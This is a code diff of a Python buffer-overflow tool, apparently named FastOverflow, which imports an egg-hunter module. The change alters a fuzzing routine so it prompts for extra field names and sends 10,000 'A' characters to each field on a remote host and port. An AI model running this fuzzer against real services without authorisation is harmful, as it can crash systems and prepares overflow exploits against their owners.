@@ -1,5 +1,4 @@
 #!/usr/bin/python3
-
 from time import sleep
 
 from buffers.egghunter import EggHunter
@@ -102,14 +101,17 @@ class FastOverflow:
         self.menu()
 
     def fuzz_fields(self):
-        adapter = self.get_adapter(self.config)
+        adapter = System.get_adapter(self.config)
         inject_func = getattr(adapter, 'inject')
+
+        print("Current Fields: " + self.config.field)
+        self.config.fields = "," + System.input("[?] Input any additional fields separated by comma : ")
 
         for field in self.config.field.split(","):
             print("-" * 100)
             print("[!] Sending 10000 A's on " + field)
-            # Todo: review full fuzzing
-            overflow = inject_func(self.config.remoteip, self.config.remoteport, self.config.field, "A" * 10000, True)
+
+            overflow = inject_func(self.config.remoteip, self.config.remoteport, field, "A" * 10000, True)
             print("[*] Waiting 3 seconds... ")
             sleep(3)
 
